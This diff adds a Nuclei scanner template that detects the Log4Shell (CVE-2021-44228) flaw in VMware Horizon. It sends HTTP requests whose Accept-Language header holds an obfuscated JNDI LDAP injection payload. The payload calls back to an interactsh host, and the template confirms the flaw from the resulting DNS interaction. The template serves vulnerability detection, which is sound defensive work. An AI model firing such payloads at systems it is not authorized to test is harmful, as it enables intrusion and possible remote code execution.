@@ -1,0 +1,43 @@
+id: vmware-horizon-log4j-jndi-rce
+
+info:
+  name: VMware Horizon Log4j JNDI RCE
+  author: johnk3r
+  severity: high
+  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in impacted VMware Horizon.
+  reference:
+    - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+    - https://github.com/projectdiscovery/nuclei-templates/commit/fa99cba4b3589e4051044c90357b97a0298017f2#diff-eadee0f4358d54254737d7b58b56c1d93e0ef637066cab998bc774befe1975a0
+  tags: rce,jndi,log4j,horizon,vmware
+
+requests:
+  - raw:
+      - |
+        GET /portal/info.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/{{Host}}.{{interactsh-url}}}
+
+      - |
+        GET /portal/info.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: ${${:,:[:-j}${:]:-n}${:@:-d}${::-i}:${:):-l}${:":-d}${:Chrome:-a}${:Mozilla:-p}:${:":-/}/127.0.0.1#{{Host}}.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})' 
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([A-Za-z0-9\.\-\_\#]+)\.([a-z0-9]+)\.([a-z]+)\.([a-z]{2,4})'   # extract Hostname
